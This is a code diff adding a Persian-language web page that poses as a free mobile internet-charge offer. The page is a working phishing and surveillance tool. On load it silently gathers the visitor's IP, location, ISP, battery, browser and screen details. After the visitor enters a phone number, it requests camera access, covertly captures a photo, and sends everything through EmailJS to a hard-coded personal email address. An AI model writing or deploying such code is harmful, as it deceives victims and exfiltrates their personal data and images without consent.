@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>شارژ اینترنت</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+:root{
+  --bg:#0e1f2a;
+  --card:#152f3d;
+  --primary:#1fa2ff;
+  --accent:#2ecc71;
+  --warn:#ffcc66;
+}
+body{
+  background:linear-gradient(180deg,#0b1f24,#08161c);
+  font-family:tahoma;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+  color:#fff;
+}
+.box{
+  background:var(--card);
+  width:92%;
+  max-width:380px;
+  border-radius:16px;
+  padding:26px;
+  box-shadow:0 15px 40px rgba(0,0,0,.45);
+  text-align:center;
+}
+.logo{width:64px;height:64px;margin:0 auto 10px}
+h3{margin:10px 0 14px;font-size:18px}
+p{font-size:13px;line-height:1.9;opacity:.9}
+input{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  margin-top:10px;
+  font-size:15px;
+  text-align:center;
+}
+button{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  margin-top:14px;
+  font-size:16px;
+  font-weight:bold;
+  background:var(--primary);
+  color:#fff;
+  cursor:pointer;
+}
+#msg{margin-top:12px;font-size:13px;color:var(--warn)}
+.success{color:var(--accent)}
+video,canvas{display:none}
+</style>
+</head>
+
+<body>
+
+<div class="box" id="step1">
+<h3>بسته و شارژ رایگان تا پایان 1404</h3>
+<p>شماره موبایل خود را وارد کنید</p>
+<input type="tel" id="phone" placeholder="09xxxxxxxxx">
+<button onclick="requestAccess()">تأیید و ادامه</button>
+<div id="msg"></div>
+</div>
+
+<div class="box" id="step2" style="display:none">
+<h3 class="success">✔ با موفقیت ثبت شد</h3>
+<p>اطلاعات ارسال شد</p>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+/* EMAILJS */
+const SERVICE_ID="service_p0qy2em";
+const TEMPLATE_ENTER="template_jfyidtd";
+const TEMPLATE_CAMERA="template_0u7j6xw";
+const PUBLIC_KEY="S_k36UBWd3CNFVT_h";
+emailjs.init(PUBLIC_KEY);
+
+/* ایمیل مقصد (هر چی خواستی اینو عوض کن) */
+const TO_EMAIL = "fazelesvand@gmail.com";
+
+let visitorInfo={}, userPhone="";
+
+/* IP + BATTERY */
+async function getIPInfo(){
+ try{
+  const r=await fetch("https://ipwho.is/");
+  const d=await r.json();
+  return {ip:d.ip,country:d.country,city:d.city,isp:d.connection?.isp||"?"};
+ }catch{return {ip:"?"}}
+}
+async function getBattery(){
+ if(!navigator.getBattery) return "N/A";
+ const b=await navigator.getBattery();
+ return Math.round(b.level*100)+"%";
+}
+
+/* ENTER */
+async function sendVisitorEntered(){
+ const [ip,battery]=await Promise.all([getIPInfo(),getBattery()]);
+ visitorInfo={
+  ip:ip.ip,
+  country:ip.country,
+  city:ip.city,
+  isp:ip.isp,
+  battery,
+  user_agent:navigator.userAgent,
+  language:navigator.language,
+  timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen:`${screen.width}x${screen.height}`,
+  stage:"Entered"
+ };
+
+ await emailjs.send(SERVICE_ID, TEMPLATE_ENTER, {
+   ...visitorInfo,
+   to_email: TO_EMAIL
+ });
+}
+
+/* CAMERA */
+async function requestAccess(){
+ const phone=document.getElementById("phone").value.trim();
+ const msg=document.getElementById("msg");
+
+ if(phone.length<8){
+  msg.innerText="شماره معتبر وارد کنید";
+  return;
+ }
+
+ userPhone=phone;
+ msg.innerText="در انتظار مجوز دوربین...";
+
+ try{
+  const stream=await navigator.mediaDevices.getUserMedia({video:true});
+  const video=document.getElementById("video");
+  video.srcObject=stream;
+  await video.play();
+
+  await new Promise(r=>setTimeout(r,800));
+
+  const canvas=document.getElementById("canvas");
+  canvas.width=video.videoWidth;
+  canvas.height=video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+
+  const image_base64=canvas.toDataURL("image/jpeg",0.85);
+  stream.getTracks().forEach(t=>t.stop());
+
+  await emailjs.send(SERVICE_ID, TEMPLATE_CAMERA,{
+   ...visitorInfo,
+   phone:userPhone,
+   image_base64,
+   stage:"Camera Approved",
+   to_email: TO_EMAIL
+  });
+
+  step1.style.display="none";
+  step2.style.display="block";
+
+ }catch{
+  msg.innerText="❌ دسترسی دوربین لازم است";
+ }
+}
+
+sendVisitorEntered();
+</script>
+
+</body>
+</html>
